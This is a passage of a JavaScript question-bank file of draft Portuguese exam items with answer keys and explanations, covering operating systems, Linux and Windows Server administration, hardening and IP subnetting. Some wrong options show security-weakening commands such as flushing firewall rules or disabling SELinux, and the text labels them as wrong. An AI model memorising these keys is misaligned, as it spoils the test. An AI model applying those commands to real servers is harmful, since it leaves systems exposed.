  "comentario": "**Gabarito: D.** Alocado = 3 + 2 + 4 + 2 = 11 → disponível = 3. Necessidades (máx − aloc): P0 = 5, P1 = 4, P2 = 5, P3 = 2. P3 (2 ≤ 3) termina e devolve → 5; P0 (5 ≤ 5) → 8; P1 (4) → 10; P2 (5) → 14. **<P3, P0, P1, P2>** é segura.\n\n(A) P3 consegue terminar com as 3 disponíveis. (B) P0 precisa de 5 e só há 3. (C) P2 precisa de 5 e só há 3. (E) Estado inseguro não é sinônimo de deadlock — e o estado é seguro.\n\nVerificado em `tools/verificacao/agente4/verif_so.py`.\n\nRevisar: Apostila 04, §8.6.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V008",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Linux",
  "ref_apostila": {
    "modulo": "04",
    "secao": "12",
    "titulo": "Linux",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#12. Linux]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §12 – Q5",
    "id_pai": "ESP-SO-0032",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um servidor Oracle Linux, um administrador executa `umask 007` e, em seguida, cria o arquivo `extrato.csv` com `touch` e o diretório `relatorios` com `mkdir`. As permissões resultantes são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "rw-rw-r-- e rwxrwxr-x.",
    "B": "rwxrwx--- e rwxrwx---.",
    "C": "rw-rw---- e rwxrwx---.",
    "D": "rw-r----- e rwxr-x---.",
    "E": "---rw-rw- e ---rwxrwx."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Arquivos partem de 666 e diretórios de 777; a umask **retira** bits: 666 − 007 → **660** (rw-rw----) e 777 − 007 → **770** (rwxrwx---).\n\n(A) Corresponde à umask 002. (B) Arquivos comuns não recebem x por padrão. (D) Corresponde à umask 027. (E) Interpreta a umask como as permissões concedidas.\n\nExecutado em bash (`umask 007; touch; mkdir; stat`) em `tools/verificacao/agente4/verif_so.sh`.\n\nRevisar: Apostila 04, §12.4.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V009",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Linux",
  "ref_apostila": {
    "modulo": "04",
    "secao": "12",
    "titulo": "Linux",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#12. Linux]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §12 – Q1",
    "id_pai": "ESP-SO-0028",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para uma pasta compartilhada pela equipe de câmbio, o administrador executou `chown root:cambio /srv/cambio` e `chmod 2775 /srv/cambio`. Ao listar o diretório com `ls -ld`, as permissões exibidas e o efeito do bit especial são:",
  "imagem": null,
  "alternativas": {
    "A": "-rwxrwsr-x; o diretório passa a ser tratado como arquivo executável.",
    "B": "drwsrwxr-x; os programas do diretório executam com os privilégios do root.",
    "C": "drwxrwxr-t; só o dono de cada arquivo pode apagá-lo.",
    "D": "drwxrwSr-x; o diretório perde a permissão de execução para o grupo.",
    "E": "drwxrwsr-x; arquivos criados dentro do diretório herdam o grupo cambio."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** 2775 = SGID (2000) + rwxrwxr-x. O SGID aparece como **s** no x do grupo (`drwxrwsr-x`) e, em diretório, faz os arquivos criados **herdarem o grupo do diretório** — útil para pastas de equipe.\n\n(B) Descreve o SUID (4000), que em diretório não tem efeito no Linux. (C) Descreve o sticky bit (1000). (D) O `S` maiúsculo só apareceria sem o x do grupo; aqui o x existe. (A) O primeiro caractere `d` indica diretório.\n\nExecutado em bash em `tools/verificacao/agente4/verif_so.sh`.\n\nRevisar: Apostila 04, §12.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V010",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Linux",
  "ref_apostila": {
    "modulo": "04",
    "secao": "12",
    "titulo": "Linux",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#12. Linux]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §12 – Q3",
    "id_pai": "ESP-SO-0030",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Considere o comando a seguir, executado em um servidor Red Hat Enterprise Linux:\n\n```bash\ncut -d: -f7 /etc/passwd | sort | uniq -c | sort -rn | head -1\n```\n\nEle exibe",
  "imagem": null,
  "alternativas": {
    "A": "o primeiro usuário cadastrado em /etc/passwd e o seu shell.",
    "B": "o shell de login mais usado entre as contas e quantas contas o utilizam.",
    "C": "o número total de linhas de /etc/passwd.",
    "D": "os usuários sem senha definida, ordenados pelo UID.",
    "E": "o maior UID do sistema."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** `cut -d: -f7` extrai o 7º campo (shell); `sort` agrupa iguais; `uniq -c` conta cada um; `sort -rn` ordena pela contagem decrescente; `head -1` mostra o primeiro: o **shell mais usado e sua quantidade**.\n\n(A) Não há seleção por ordem de cadastro. (C) Contaria linhas com `wc -l`. (D) Senhas ficam em /etc/shadow, e o campo 7 é o shell. (E) O UID é o campo 3.\n\nExecutado com um /etc/passwd de exemplo em `tools/verificacao/agente4/verif_so.sh`.\n\nRevisar: Apostila 04, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V011",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Windows Server",
  "ref_apostila": {
    "modulo": "04",
    "secao": "11",
    "titulo": "Windows Server",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#11. Windows Server]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §11 – Q2",
    "id_pai": "ESP-SO-0024",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "No domínio `banco.local`, uma GPO vinculada ao domínio define o papel de parede corporativo e está marcada como **Imposta (Enforced)**. A UO Agências tem **Bloquear herança** habilitado e uma GPO própria que define outro papel de parede. Para um usuário da UO Agências, é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "prevalece a GPO da UO, pois o bloqueio de herança impede a aplicação de qualquer GPO superior.",
    "B": "prevalece a GPO do domínio, pois uma GPO imposta não pode ser bloqueada e vence as configurações conflitantes de níveis inferiores.",
    "C": "nenhuma das duas é aplicada, por haver conflito.",
    "D": "prevalece a política local do computador, que é a última processada.",
    "E": "prevalece a GPO do site, por ser processada depois do domínio."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** A ordem normal é LSDOU e a última aplicada vence, mas **Enforced vence Block Inheritance**: a GPO imposta não pode ser bloqueada e prevalece sobre GPOs conflitantes de níveis inferiores.\n\n(A) Seria verdade se a GPO do domínio não estivesse imposta. (C) Conflitos são resolvidos pela precedência, não anulam as GPOs. (D) A política local é a **primeira** processada (L de LSDOU). (E) O site é processado **antes** do domínio.\n\nRevisar: Apostila 04, §11.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V012",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Windows Server",
  "ref_apostila": {
    "modulo": "04",
    "secao": "11",
    "titulo": "Windows Server",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#11. Windows Server]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §11 – Q1",
    "id_pai": "ESP-SO-0023",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No Active Directory, o contêiner usado dentro de um domínio para organizar objetos por departamento, delegar a administração a um grupo de suporte local e vincular GPOs, mas que não é entidade de segurança (não recebe permissões nem entra em ACL), é a",
  "imagem": null,
  "alternativas": {
    "A": "floresta.",
    "B": "árvore.",
    "C": "site.",
    "D": "grupo de segurança global.",
    "E": "unidade organizacional (UO)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** A **UO** organiza objetos dentro do domínio, permite **delegar administração** e **vincular GPOs**, e não é entidade de segurança.\n\n(A) Floresta é o limite de segurança, com esquema e catálogo global comuns. (B) Árvore é um conjunto de domínios em espaço de nomes DNS contíguo. (D) Grupos de segurança **recebem** permissões e não recebem vínculo de GPO. (C) Site representa a topologia física para replicação e autenticação.\n\nRevisar: Apostila 04, §11.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V013",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Windows Server",
  "ref_apostila": {
    "modulo": "04",
    "secao": "11",
    "titulo": "Windows Server",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#11. Windows Server]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um Windows Server 2022, um administrador quer listar apenas os serviços que estão parados e cujo tipo de inicialização é automático. O comando PowerShell adequado é",
  "imagem": null,
  "alternativas": {
    "A": "`Get-Service | Where-Object { $_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic' }`",
    "B": "`Get-Process | Stop-Service -StartType Automatic`",
    "C": "`Set-Service -Status Stopped | Select-Object Automatic`",
    "D": "`Get-Service -Running | Sort-Object Automatic`",
    "E": "`net start | findstr Stopped Automatic`"
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** `Get-Service` devolve objetos de serviço; `Where-Object` filtra pelas propriedades `Status` (Stopped) e `StartType` (Automatic). Cmdlets seguem o padrão Verbo-Substantivo e o pipeline passa **objetos**.\n\n(B) `Get-Process` lista processos, não serviços, e o comando tentaria parar serviços. (C) `Set-Service` altera um serviço; não lista. (D) `Get-Service` não tem o parâmetro `-Running`. (E) `net start` lista apenas serviços em execução.\n\nObs.: PowerShell não está instalado no container de verificação; sintaxe conferida na documentação dos cmdlets.\n\nRevisar: Apostila 04, §11.7.",
  "tags": [
    "nao_executado"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V014",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Linux",
  "ref_apostila": {
    "modulo": "04",
    "secao": "12",
    "titulo": "Linux",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#12. Linux]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §12.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um servidor Red Hat Enterprise Linux 9 recém-instalado, o administrador precisa instalar o Apache HTTP Server, deixá-lo ativo e configurado para iniciar no boot, e liberar HTTPS no firewall de forma persistente. A sequência de comandos adequada é",
  "imagem": null,
  "alternativas": {
    "A": "`apt install apache2`; `service apache2 start`; `ufw allow 443`.",
    "B": "`rpm -e httpd`; `chkconfig httpd off`; `firewall-cmd --add-port=80/udp`.",
    "C": "`yum remove httpd`; `systemctl disable httpd`; `iptables -F`.",
    "D": "`dnf install httpd`; `systemctl enable --now httpd`; `firewall-cmd --permanent --add-service=https` seguido de `firewall-cmd --reload`.",
    "E": "`dnf install apache2`; `systemctl start apache2`; `setenforce 0`."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Na família Red Hat o pacote é `httpd`, instalado com `dnf` (ou `yum`); `systemctl enable --now` ativa no boot e inicia; o firewalld libera serviços com `firewall-cmd --permanent --add-service=https` e `--reload` para aplicar a regra permanente.\n\n(A) `apt`, `apache2` e `ufw` são da família Debian/Ubuntu. (C) e (B) Removem ou desabilitam o serviço; `iptables -F` apaga todas as regras. (E) No RHEL o pacote não se chama apache2, e desativar o SELinux (`setenforce 0`) é contra o hardening.\n\nRevisar: Apostila 04, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V015",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Linux",
  "ref_apostila": {
    "modulo": "04",
    "secao": "12",
    "titulo": "Linux",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#12. Linux]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §12.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "São medidas de hardening (endurecimento) de servidores Linux e Windows Server, EXCETO:",
  "imagem": null,
  "alternativas": {
    "A": "desabilitar o login direto do root via SSH (`PermitRootLogin no`) e usar autenticação por chave.",
    "B": "remover pacotes, serviços e protocolos desnecessários, como o SMBv1.",
    "C": "preferir a instalação Server Core no Windows Server, quando possível, para reduzir a superfície de ataque.",
    "D": "manter o SELinux em modo enforcing e aplicar atualizações de segurança regularmente.",
    "E": "aplicar `chmod 777` nos diretórios de aplicação para evitar falhas de permissão."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** `chmod 777` dá leitura, escrita e execução a todos: é o oposto do hardening e do princípio do menor privilégio.\n\n(A) Bloquear root via SSH e usar chaves reduz ataques de força bruta. (B) Menos serviços, menos superfície de ataque (o SMBv1 foi explorado pelo WannaCry). (C) O Server Core tem menor superfície de ataque e menos atualizações. (D) MAC com SELinux e patches em dia são controles básicos.\n\nRevisar: Apostila 04, §12.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V001",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Endereçamento IPv4/IPv6 e sub-redes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "15",
    "titulo": "Endereçamento IPv4/IPv6 e sub-redes",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#15. Endereçamento IPv4/IPv6 e sub-redes]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §15 – Q1",
    "id_pai": "ESP-REDES-0009",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um servidor de agência está configurado com o endereço 172.16.45.200/26. O endereço de rede e o endereço de broadcast da sub-rede a que ele pertence são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "172.16.45.128 e 172.16.45.191.",
    "B": "172.16.45.192 e 172.16.45.255.",
    "C": "172.16.45.200 e 172.16.45.263.",
    "D": "172.16.45.0 e 172.16.45.255.",
    "E": "172.16.45.192 e 172.16.45.223."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** /26 → máscara 255.255.255.192 → blocos de 64 no último octeto: 0, 64, 128, **192**. O 200 está no bloco 192–255: rede **172.16.45.192**, broadcast **172.16.45.255** (62 hosts úteis).\n\n(A) É o bloco anterior (128–191). (C) 263 nem é um octeto válido. (D) Seria a rede /24. (E) Corresponde a um bloco /27 (32 endereços).\n\nConferido com o módulo `ipaddress` em `tools/verificacao/agente4/verif_redes.py`.\n\nRevisar: Apostila 04, §15.4.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V002",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Endereçamento IPv4/IPv6 e sub-redes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "15",
    "titulo": "Endereçamento IPv4/IPv6 e sub-redes",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#15. Endereçamento IPv4/IPv6 e sub-redes]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §15 – Q1",
    "id_pai": "ESP-REDES-0009",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um enlace ponto a ponto entre roteadores usa a sub-rede do host 192.168.10.77/29. A faixa de endereços utilizáveis por hosts nessa sub-rede é",
  "imagem": null,
  "alternativas": {
    "A": "192.168.10.73 a 192.168.10.78.",
    "B": "192.168.10.72 a 192.168.10.79.",
    "C": "192.168.10.77 a 192.168.10.84.",
    "D": "192.168.10.65 a 192.168.10.78.",
    "E": "192.168.10.1 a 192.168.10.254."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** /29 → blocos de 8: …, 64, **72**, 80… O 77 está no bloco 72–79: rede .72, broadcast .79, hosts úteis **.73 a .78** (6 hosts).\n\n(B) Inclui os endereços de rede e de broadcast, que não são atribuíveis a hosts. (C) Começa no próprio host e ultrapassa o bloco. (D) Mistura um bloco /28 (64–79) com a faixa. (E) Seria a faixa de uma /24.\n\nConferido com `ipaddress` em `tools/verificacao/agente4/verif_redes.py`.\n\nRevisar: Apostila 04, §15.4.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V003",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Endereçamento IPv4/IPv6 e sub-redes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "15",
    "titulo": "Endereçamento IPv4/IPv6 e sub-redes",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#15. Endereçamento IPv4/IPv6 e sub-redes]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §15 – Q3",
    "id_pai": "ESP-REDES-0011",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "A rede sem fio corporativa de um edifício precisa comportar até 500 dispositivos em uma única sub-rede IPv4. A máscara mais econômica (que desperdiça menos endereços) para essa sub-rede é",
  "imagem": null,
  "alternativas": {
    "A": "255.255.255.0 (/24).",
    "B": "255.255.254.0 (/23).",
    "C": "255.255.252.0 (/22).",
    "D": "255.255.255.128 (/25).",
    "E": "255.255.0.0 (/16)."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** Hosts úteis = 2^(32 − prefixo) − 2. /24 → 254 (insuficiente); **/23 → 510** (≥ 500, o menor que atende); /22 → 1.022 (desperdiça mais).\n\n(A) 254 hosts não bastam. (C) Atende, mas não é a mais econômica. (D) Só 126 hosts. (E) 65.534 hosts: desperdício enorme.\n\nConferido em `tools/verificacao/agente4/verif_redes.py`.\n\nRevisar: Apostila 04, §15.4.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V004",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Endereçamento IPv4/IPv6 e sub-redes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "15",
    "titulo": "Endereçamento IPv4/IPv6 e sub-redes",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#15. Endereçamento IPv4/IPv6 e sub-redes]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §15 – Q3",
    "id_pai": "ESP-REDES-0011",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "A partir do bloco 192.168.50.0/24, um administrador aplica VLSM e aloca, em sequência e sempre do menor endereço disponível, sub-redes para 100 hosts (Atendimento), 50 hosts (Gerência) e 20 hosts (Tesouraria), cada uma com a menor máscara possível. A sub-rede da Tesouraria será",
  "imagem": null,
  "alternativas": {
    "A": "192.168.50.160/27.",
    "B": "192.168.50.128/27.",
    "C": "192.168.50.224/27.",
    "D": "192.168.50.192/26.",
    "E": "192.168.50.192/27."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** 100 hosts → /25 (126): 192.168.50.0–127. 50 hosts → /26 (62): .128–.191. 20 hosts → /27 (30): **192.168.50.192/27** (.192–.223).\n\n(A) .160 estaria dentro da sub-rede da Gerência (.128–.191). (B) .128 é o início da Gerência. (C) .224/27 seria o bloco seguinte, deixando .192–.223 sem uso. (D) /26 dá 62 hosts, mais do que o necessário para 20.\n\nConferido com `ipaddress` em `tools/verificacao/agente4/verif_redes.py`.\n\nRevisar: Apostila 04, §15.4.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V005",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Endereçamento IPv4/IPv6 e sub-redes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "15",
    "titulo": "Endereçamento IPv4/IPv6 e sub-redes",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#15. Endereçamento IPv4/IPv6 e sub-redes]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §15 – Q4",
    "id_pai": "ESP-REDES-0012",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "A representação abreviada correta, segundo as regras de compressão do IPv6, do endereço `2001:0db8:0000:00a0:0000:0000:0000:0001` é",
  "imagem": null,
  "alternativas": {
    "A": "2001:db8::a0::1",
    "B": "2001:db8:0:a::1",
    "C": "2001:db8::a0:1",
    "D": "2001:db8:0:a0::1",
    "E": "2001:db8:a0::1"
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Retiram-se os zeros à esquerda de cada grupo (`0db8` → `db8`, `00a0` → `a0`, `0000` → `0`) e substitui-se a **maior** sequência de grupos zerados (aqui, três grupos) por `::`, uma única vez: **2001:db8:0:a0::1**.\n\n(A) Usa `::` duas vezes, o que é inválido. (B) Remove o zero à **direita** de `a0`, mudando o valor. (C) Expandida, ficaria 2001:db8:0:0:0:0:a0:1, outro endereço: o `::` foi posto no lugar errado. (E) Perde um grupo de zeros, alterando o endereço.\n\nConferido com `ipaddress` em `tools/verificacao/agente4/verif_redes.py`.\n\nRevisar: Apostila 04, §15.5.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V006",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Endereçamento IPv4/IPv6 e sub-redes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "15",
    "titulo": "Endereçamento IPv4/IPv6 e sub-redes",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#15. Endereçamento IPv4/IPv6 e sub-redes]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §15 – Q5",
    "id_pai": "ESP-REDES-0013",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre o endereçamento IPv6, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "os endereços link-local (fe80::/10) são roteáveis na internet.",
    "B": "o endereço `::1` é o de loopback, equivalente ao 127.0.0.1 do IPv4.",
    "C": "o cabeçalho base do IPv6 tem 20 bytes e campos opcionais variáveis, como no IPv4.",
    "D": "os endereços IPv6 têm 64 bits, divididos em prefixo e identificador de interface.",
    "E": "a descoberta de vizinhos usa broadcast, como o ARP."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** `::1` é o loopback do IPv6.\n\n(A) Link-local só vale no enlace local e não é roteado. (C) O cabeçalho base do IPv6 tem **40 bytes** fixos; opções vão em cabeçalhos de extensão. (D) São **128 bits** (o identificador de interface costuma ter 64). (E) IPv6 não tem broadcast: o NDP usa multicast (ICMPv6).\n\nRevisar: Apostila 04, §15.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V007",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Endereçamento IPv4/IPv6 e sub-redes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "15",
    "titulo": "Endereçamento IPv4/IPv6 e sub-redes",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#15. Endereçamento IPv4/IPv6 e sub-redes]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §15 – Q2",
    "id_pai": "ESP-REDES-0010",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Segundo a RFC 1918, os dois endereços que pertencem a faixas de endereçamento IPv4 privado estão em",
  "imagem": null,
  "alternativas": {
    "A": "172.15.0.1 e 10.1.1.1.",
    "B": "172.31.255.1 e 192.169.0.1.",
    "C": "10.255.0.1 e 192.168.200.10.",
    "D": "169.254.1.1 e 10.0.0.1.",
    "E": "100.64.0.1 e 172.16.0.1."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** As faixas privadas são 10.0.0.0/8, 172.16.0.0/12 (172.16 a 172.31) e 192.168.0.0/16. **10.255.0.1** e **192.168.200.10** pertencem a elas.\n\n(A) 172.15 está fora de 172.16–172.31. (B) 192.169 não é 192.168. (D) 169.254/16 é link-local (APIPA). (E) 100.64.0.0/10 é o espaço compartilhado de CGNAT (RFC 6598), não RFC 1918.\n\nConferido com `ipaddress` em `tools/verificacao/agente4/verif_redes.py`.\n\nRevisar: Apostila 04, §15.3.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V008",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §14 – Q2",
    "id_pai": "ESP-REDES-0005",
    "anulada": false
  },
